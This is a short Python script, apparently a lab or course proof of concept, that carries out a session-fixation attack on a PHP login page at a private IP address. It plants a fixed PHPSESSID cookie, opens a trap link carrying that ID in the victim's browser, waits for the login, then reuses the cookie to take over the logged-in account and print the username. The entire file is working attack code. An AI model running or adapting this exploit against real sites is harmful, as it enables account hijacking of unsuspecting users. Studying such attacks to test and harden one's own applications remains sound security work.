import requests
import re
import webbrowser # Library to open the browser automatically

# Use a simple ID that Chrome and PHP both love
FIXED_SID = "HackerSession123"
# English: Update BASE_URL and HOME_URL with the server's IP address
SERVER_IP = "192.168.56.1" # Replace with your actual IP
BASE_URL = f"http://{SERVER_IP}/CyberProject/login.php"
HOME_URL = f"http://{SERVER_IP}/CyberProject/home.php"

def run_exploit():
    session = requests.Session()
    session.cookies.set('PHPSESSID', FIXED_SID)

    print(f"[*] Target Session ID: {FIXED_SID}")
    print("[*] Initializing session on server...")
    session.get(BASE_URL)
    
    # Generate the trap link
    trap_link = f"{BASE_URL}?PHPSESSID={FIXED_SID}"
    
    print("\n" + "="*60)
    print("STEP 1: Launching the Trap!")
    print(f"Opening browser to: {trap_link}")
    print("\n--- ACTION REQUIRED ---")
    print("Please log in to the website in the window that just opened.")
    print("="*60)
    
    # AUTOMATIC STEP: This opens your default browser with the fixed session ID
    webbrowser.open(trap_link)
    
    input("\n[>] After you logged in, press ENTER here to prove the hijack...")

    print(f"[*] Attempting to hijack session...")
    response = session.get(HOME_URL)
    
    if "Logged in as" in response.text:
        match = re.search(r"Logged in as: <strong>(.*?)</strong>", response.text)
        username = match.group(1) if match else "Unknown User"
        
        print("\n" + "!"*40)
        print(f"[!!!] SUCCESS: SESSION HIJACKED [!!!]")
        print(f"[+] We are now logged in as: {username}")
        print(f"[+] The attacker script now has full control of the account.")
        print("!"*40)
    else:
        print("\n[-] Attack failed. The server doesn't recognize this session as logged in.")

if __name__ == "__main__":
    run_exploit()